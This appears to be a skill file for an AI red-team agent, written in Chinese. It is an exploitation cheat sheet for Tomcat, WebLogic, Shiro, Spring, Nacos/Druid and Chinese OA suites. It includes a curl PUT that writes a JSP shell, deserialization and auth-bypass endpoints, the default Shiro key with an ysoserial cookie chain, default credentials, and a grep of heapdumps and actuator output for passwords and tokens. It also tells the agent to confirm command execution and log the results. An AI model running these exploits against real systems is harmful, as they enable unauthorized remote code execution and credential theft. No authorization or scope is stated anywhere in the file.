---
name: web-midware
description: Web 中间件与国产 OA 专项：Tomcat/WebLogic/Shiro/Spring/Nacos/泛微/致远/用友 的版本判据、对应 Nday、一键验证命令
whenToUse: 指纹命中中间件或 OA，或 404/500 页有特征；打 Nday 前先按这里的判据确认版本
role: exploit
enabled: true
---

# 中间件与 OA 专项

## 先确认版本，再挑 Nday

~~~bash
httpx -u TARGET -title -tech-detect -status-code -web-server
nuclei -u TARGET -tags tech -silent
curl -s -o /dev/null -w '%{http_code}\n' http://TARGET/actuator/env
curl -s http://TARGET/nacos/ | head -20
curl -s http://TARGET/druid/index.html | head -20
~~~

## Tomcat

~~~
判据：/docs/ 存在、ErrorReportValve 版本页、/manager/html 401
弱口令：tomcat/tomcat、admin/admin -> /manager/html 部署 war
CVE-2017-12615（PUT 任意写）：curl -X PUT 'http://T/vuln.jsp/' --data '<% out.println(1);%>'
CVE-2020-1938（AJP Ghostcat）：8009 端口，读 WEB-INF/web.xml
~~~

## WebLogic

~~~
判据：/console/login/LoginForm.jsp、7001 端口、Server 头空
CVE-2017-10271：POST /wls-wsat/CoordinatorPortType  XML 反序列化
CVE-2019-2725：/_async/AsyncResponseService
CVE-2020-14882：/console/css/%252e%252e%252fconsole.portal 未授权
nuclei -u TARGET -t http/cves/2017/CVE-2017-10271.yaml
~~~

## Shiro

~~~
判据：Set-Cookie: rememberMe=deleteMe
检测：rememberMe 填任意值，看响应是否回 deleteMe
利用：ysoserial 生成链 -> AES-CBC 加密（默认 key kPH+bIxk5D2deZiIxcaaaA==）-> base64 塞 Cookie
~~~

## Spring

~~~
判据：/actuator（env/heapdump/httptrace）、Whitelabel Error Page
CVE-2022-22965（Spring4Shell）
CVE-2022-22947（Gateway Actuator）：/actuator/gateway/routes 注入 SpEL
heapdump 里捞凭据：strings heapdump | grep -iE 'password|secret|token'
~~~

## Nacos / Druid / Actuator

~~~
Nacos 未授权：/nacos/v1/auth/users?pageNo=1&pageSize=9
Nacos 默认口令：nacos/nacos -> 改配置注入
Druid：/druid/websession.html 拿 session、/druid/sql.html 看 SQL
Actuator env：/actuator/env 搜 password/secret/token
~~~

## 国产 OA

~~~
泛微 e-cology：/weaver/bsh.servlet.BshServlet（BeanShell RCE）
致远 OA：/seeyon/htmlofficeservlet 任意文件上传（DBSTEP 头）
用友 NC：/uapws/service 反序列化；/servlet/~ic/bsh.servlet.BshServlet
通达 OA：/general/document/index.php 组合漏洞
~~~

## 判据与落库

- 只认**命令回显或文件落地**：id / whoami / 写入文件能被访问
- 版本判据（标题、错误页、banner）只能算 suspected，必须再走一次验证请求
- 落库：redteam_vuln_add，severity 按影响（RCE=critical），evidence 贴请求原文 + 回显前 200 字节
- 命中后立刻 redteam_poc_add 回填（带 component/versions），下次同组件直接复用